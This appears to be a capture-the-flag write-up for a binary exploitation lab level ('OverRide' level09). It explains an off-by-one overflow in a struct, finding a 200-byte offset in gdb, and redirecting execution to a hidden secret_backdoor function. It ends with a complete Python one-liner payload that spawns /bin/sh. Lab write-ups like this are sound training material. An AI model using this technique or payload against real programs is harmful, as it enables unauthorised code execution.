while reading the assembly code of this level and after following the control flow of the program.
we noticed a call to two functions set_username, set_msg that has and argument which is
a struct passed by address
the first function (set_username) asks for a username and puts it in the struct member name[40]
we noticed the counter of the loop passed the len of the name by 1 and since it's a struct we 
can use that to override the other memebers of the struct which is len in this case

so we need to use the last 1 byte and in this case we gonna use '\xff'
-------------------------------------
(gdb) run <<< $(python -c "print 'A'*40 + '\xff'")
Starting program: /home/users/level09/level09 <<< $(python -c "print 'A'*40 + '\xff'")

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb)
-------------------------------------

now we need to get the eip address and we gonna use this load:
  -> AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
  -> or calculate it getting the first adress the flow starts, ans that's at rbp-0xc0 and add 8 bytes for the push rbp

 and they both give the offset 200

 so now we have the offset

 we need now to get a shell and we noticed we have a functions not used  that's called secret_backdoor
 now we need to get the address of secret_backdoor:
-------------------------------------
(gdb) x/s secret_backdoor
0x55555555488c <secret_backdoor>:	 "UH\211\345H\203ĀH\213\005\035\027 "
(gdb)
-------------------------------------

now we just need to make everything together:
-------------------------------------
level09@OverRide:~$ (python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'"; cat ) | ./level09
